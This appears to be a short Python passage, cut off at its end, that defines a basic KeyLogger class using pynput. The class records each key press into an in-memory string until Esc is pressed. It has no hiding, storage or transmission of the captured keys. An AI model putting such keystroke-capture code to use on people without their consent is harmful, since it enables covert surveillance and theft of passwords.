import pynput
from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        self.log += str(key)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False

def main():
    key_logger = KeyLogger()
    listener = keyboard.Listener(on_press=key_logger.on_press, on_release=key_logger.on_release)
    listener.start()
    listener.join()

if __name__ == "__main__":
